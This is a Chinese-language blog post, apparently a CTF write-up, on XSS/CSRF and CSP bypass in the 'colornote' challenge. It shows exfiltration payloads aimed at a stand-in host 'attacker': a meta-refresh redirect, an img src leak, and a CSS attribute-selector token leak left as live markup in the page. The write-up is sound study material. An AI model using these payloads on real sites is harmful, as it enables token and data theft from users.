@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xss/csrf升级 | DUDUの博客</title><meta name="author" content="DUDU"><meta name="copyright" content="DUDU"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="css&#x2F;csrf 触发条件优化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss&#x2F;csrf升级">
+<meta property="og:url" content="https://rpsjn.github.io/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/index.html">
+<meta property="og:site_name" content="DUDUの博客">
+<meta property="og:description" content="css&#x2F;csrf 触发条件优化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rpsjn.github.io/gallery/DM1/5uogh2ft5zt.jpg">
+<meta property="article:published_time" content="2026-06-06T16:18:37.000Z">
+<meta property="article:modified_time" content="2026-06-09T02:14:34.072Z">
+<meta property="article:author" content="DUDU">
+<meta property="article:tag" content="xss&#x2F;csrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rpsjn.github.io/gallery/DM1/5uogh2ft5zt.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "xss/csrf升级",
+  "url": "https://rpsjn.github.io/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/",
+  "image": "https://rpsjn.github.io/gallery/DM1/5uogh2ft5zt.jpg",
+  "datePublished": "2026-06-06T16:18:37.000Z",
+  "dateModified": "2026-06-09T02:14:34.072Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "DUDU",
+      "url": "https://rpsjn.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://rpsjn.github.io/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: DUDU","link":"链接: ","source":"来源: DUDUの博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss/csrf升级',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/gallery/DM1/pikaa.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Images</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/gallery/DM1/5uogh2ft5zt.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DUDUの博客</span></a><a class="nav-page-title" href="/"><span class="site-name">xss/csrf升级</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Images</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">xss/csrf升级</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">更新于</span><time datetime="2026-06-09T02:14:34.072Z" title="更新于 2026-06-09 10:14:34">2026-06-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/">前端漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>对于XSS或者CSRF</p>
+<p>导航触发点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://你的IP/&quot;</span><br><span class="line">mata被用来处理元数据相关的内容，但浏览器宽容性导致其可以在很多位置被解析，不仅是在head标签中</span><br><span class="line">&lt;a  需要点击</span><br><span class="line">&lt;form  需要配合js脚本使用</span><br><span class="line">&lt;img src /&lt;link src 可用来带外数据（图片往往设有宽泛的限制）</span><br><span class="line">&lt;iframe &lt;object &lt;embed 内嵌页面 权限分割，检测分割 子页面逃离主页面的限制/子页面继承主页面的关键信息</span><br></pre></td></tr></table></figure>
+
+<p>CSP策略常规检测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CSP策略（内容安全性检测）：</span><br><span class="line">default-src 默认源控制 当其他具体资源的源未设置时，采用此配置 多设置为self</span><br><span class="line">scpript-src js脚本来源限制和权限设置</span><br><span class="line">style- src	控制CSS样式表的加载和内联执行</span><br><span class="line">img-src 控制图片的加载源</span><br><span class="line">connect-src 控制发起网络连接请求的目的地</span><br><span class="line">frame-src / child-src 控制&lt;frame &lt;iframe允许嵌入的页面来源</span><br><span class="line">object-src 控制&lt;object &lt;embed &lt;applet 等插件的加载来源</span><br><span class="line"></span><br><span class="line">常用值：</span><br><span class="line">self</span><br><span class="line">none</span><br><span class="line">*</span><br><span class="line">unsafe-inline</span><br><span class="line">unsafe-eval </span><br><span class="line">nonce-[随机字符串] 允许执行带有相同nonce的js代码 </span><br><span class="line">sha256-[哈希值] 允许执行内容hash匹配的代码</span><br></pre></td></tr></table></figure>
+
+<p>浏览器策略：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SameSite=Lax 同源策略 协议，ip，端口 </span><br><span class="line">Cors预检 使用OPTION请求询问服务器是否允许跨域，在使用复杂传输格式或自定义请求头时 服务端应返回：Access-control-Allow-Origin:</span><br><span class="line">Fetch-Matadata 浏览器带有请求信息说明（主动向服务器提供可参考信息，例如：是否跨源，跨站，请求目的，请求来源时Ajax，iframe等）</span><br><span class="line"></span><br><span class="line">HttpOnly属性隔离</span><br><span class="line">进程隔离，防V8引擎的RCE漏洞</span><br><span class="line"></span><br><span class="line">https协议优先原则</span><br></pre></td></tr></table></figure>
+
+<p>异常点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.对于使用了nonce防护的页面来说，如果其可以内嵌iframa页面，子页面中的js不受父页面的CSP策略影响</span><br><span class="line">原理：CSP策略以DOM为单位，根据请求的响应头来生效，无请求的行为遵从父页面CSP</span><br><span class="line"></span><br><span class="line">2.JsFuck技术，[]的运算</span><br><span class="line"></span><br><span class="line">3.自动修复和异常过滤问题</span><br><span class="line"></span><br><span class="line">4.headless模式的浏览器允许js创建新的窗口，这将允许顶级导航的form行为（此行为导致跨站可携带Cookie），注意当js所在网站为https，post跳转默认不允许https跳往http,注意网站是否强制https</span><br></pre></td></tr></table></figure>
+
+<h4 id="京麟2026-WEB-colornote"><a href="#京麟2026-WEB-colornote" class="headerlink" title="京麟2026 WEB colornote"></a>京麟2026 WEB colornote</h4><p>进入题目拿到源码可以看到CSP策略的配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const csp = [</span><br><span class="line">  &quot;default-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;script-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;style-src &#x27;self&#x27; data:&quot;,</span><br><span class="line">  &quot;img-src * data:&quot;,</span><br><span class="line">  &quot;font-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;connect-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;frame-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;object-src &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;base-uri &#x27;none&#x27;&quot;,</span><br><span class="line">  &quot;form-action &#x27;self&#x27;&quot;,</span><br><span class="line">].join(&quot;; &quot;);</span><br></pre></td></tr></table></figure>
+
+<p>因为看到前端有bot可以传url，想到应该是csrf+xss</p>
+<p>在源码里也能看到，token被写到前端的note中了，前端提供了写html格式的位置，且后创建的note会被放到上方，想到通过属性的闭合去读下面的内容</p>
+<p>因为“会被下面的”闭合，且源码中未使用‘，故使用单引号闭合，题目也贴心的在目标的下方创建了一条note，明显给我们提供闭合的位置</p>
+<p>此时的路径应为：1.修改目标下方的note 2.创建&lt;img标签 src属性为 src&#x3D;’attacker地址&#x2F;目标内容&#x2F;修改后的note‘ 3.访问notes实现解析（因为创建后的跳转只显示单条note，而无法读到其他的内容）</p>
+<p>但是bot页面只可以传一个url地址，需要实现自动跳转（完成流程），且自动跳转需要携带cookie（进行操作所需）</p>
+<p>这里有一些问题：</p>
+<p>自动执行操作时，fetch和Ajax方式不会携带cookie（cookie有httponly配置），只会访问同源网站时自动携带，也就是说只能通过form进行顶级跳转时自动携带，但是跳转意味者接下来的js不会执行，更不可能同时进行两次form的提交(或许可以)，总之需要另一个方式进行多次的带cookie跳转（只有顶级目录携带cookie）,内嵌页面可以访问notes目录用于解析（但不可以发起带cookie的form请求，因为不是顶级导航）</p>
+<p>搜集可以带url跳转的标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta 元数据控制标签</span><br><span class="line">&lt;a 可点链接</span><br><span class="line">&lt;form 表格提交</span><br><span class="line">&lt;img 图片导入</span><br><span class="line">&lt;link css引入标签</span><br><span class="line">&lt;iframe 内嵌页面</span><br><span class="line">&lt;object &lt;embed 模块引入</span><br></pre></td></tr></table></figure>
+
+<p>a标签需要用户触发，form需要js提交或者用户点击，img、link等可以直接触发，但都不是顶级导航，只有meta标签有一个属性会导致顶级导航改变</p>
+<p>meta：规定位于head标签内，但由于现代浏览器的宽容性，meta标签即使位于各标签深处，也会被正常解析</p>
+<p>因此将写入的内容添加&lt;meta http-equiv&#x3D;”refrash” content&#x3D;”0;<a target="_blank" rel="noopener" href="http://attacker/">http://attacker/</a>“</p>
+<p>此时当写入操作完成后，通过解析会再次回到我们控制的服务器，由于meta标签只解析一次，故从下往上写入meta标签来实现依次轮询</p>
+<p>现在的流程为：1.修改目标下方的一条note，放入闭合单引号和meta标签跳转 2.创建外带note并通过meta标签跳转至notes</p>
+<p>最终发现img中的超长url访问被拦截，这里不是很理解，因为在浏览器中访问被拦截的链接是可以的，可以看到带出的内容。。。。</p>
+<p>然后就是link的background的用法：</p>
+<link rel=stylesheet href="data:text/css,.a[x*='<!--abc'] { background: url(http://attacker/hit) }
+
+<p>当a类的x属性匹配到指定字符串时，进行图片渲染（访问我们的服务器），因此可逐位爆破，此方式结合meta的刷新机制可爆破出目标token</p>
+<p><strong>WP中使用了windows.open来控制爆破流程</strong></p>
+<p>这里很神奇，因为我一开始也尝试使用此方式打开新窗口，但是像这种打开窗口的行为往往会被阻止，我试着也是这样</p>
+<p>注意到浏览器是取消了https强制转换，使用了–no-sandbox，没有细究，居然可以打开其他窗口，这样的话就可以进行windows.open的操作了</p>
+<p>配置主爆破循环在浏览器的一个窗口</p>
+<p>配置服务器接受爆破内容，并同步爆破进度</p>
+<p>最终得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rpsjn.github.io">DUDU</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rpsjn.github.io/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/">https://rpsjn.github.io/2026/06/07/xss-csrf升级/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://rpsjn.github.io" target="_blank">DUDUの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xss-csrf/">xss/csrf</a></div><div class="post-share"><div class="social-share" data-image="/gallery/DM1/5uogh2ft5zt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/01/%E6%9F%90%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E4%B8%8E%E8%84%B1%E5%A3%B3/" title="某软件检测绕过与脱壳"><img class="cover" src="/gallery/DM1/1737429204145.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">某软件检测绕过与脱壳</div></div><div class="info-2"><div class="info-item-1">一、样本信息 梆梆加固 尝试附件并监视so加载，在so加载完成时，触发退出 发现libdexhelper libsgcore libturingau 壳相关so文件的加载 无报错，说明子线程kill hook子线程创建函数 clone pthread_create,触发非法地址访问，推测进行了非法跳转 open...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/gallery/DM1/pikaa.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DUDU</div><div class="author-info-description">in&out is key</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/RPSJN"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:dudu88485n@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">技术交流QQ:2679156810</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%AC%E9%BA%9F2026-WEB-colornote"><span class="toc-number">1.</span> <span class="toc-text">京麟2026 WEB colornote</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/" title="xss/csrf升级"><img src="/gallery/DM1/5uogh2ft5zt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xss/csrf升级"/></a><div class="content"><a class="title" href="/2026/06/07/xss-csrf%E5%8D%87%E7%BA%A7/" title="xss/csrf升级">xss/csrf升级</a><time datetime="2026-06-06T16:18:37.000Z" title="发表于 2026-06-07 00:18:37">2026-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/01/%E6%9F%90%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E4%B8%8E%E8%84%B1%E5%A3%B3/" title="某软件检测绕过与脱壳"><img src="/gallery/DM1/1737429204145.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某软件检测绕过与脱壳"/></a><div class="content"><a class="title" href="/2026/06/01/%E6%9F%90%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E4%B8%8E%E8%84%B1%E5%A3%B3/" title="某软件检测绕过与脱壳">某软件检测绕过与脱壳</a><time datetime="2026-06-01T01:22:01.000Z" title="发表于 2026-06-01 09:22:01">2026-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化"><img src="/gallery/DM1/1737427802680.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化"/></a><div class="content"><a class="title" href="/2026/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化">java反序列化</a><time datetime="2026-04-30T05:41:54.000Z" title="发表于 2026-04-30 13:41:54">2026-04-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/30/%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%B0%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95/" title="从漏洞挖掘到逆向调试"><img src="/gallery/DM1/1737429691478.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从漏洞挖掘到逆向调试"/></a><div class="content"><a class="title" href="/2025/11/30/%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%B0%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95/" title="从漏洞挖掘到逆向调试">从漏洞挖掘到逆向调试</a><time datetime="2025-11-30T13:37:09.000Z" title="发表于 2025-11-30 21:37:09">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/hello-world/" title="Hello World"><img src="/gallery/DM1/1737429493216.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/11/25/hello-world/" title="Hello World">Hello World</a><time datetime="2025-11-25T10:19:31.862Z" title="发表于 2025-11-25 18:19:31">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By DUDU</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
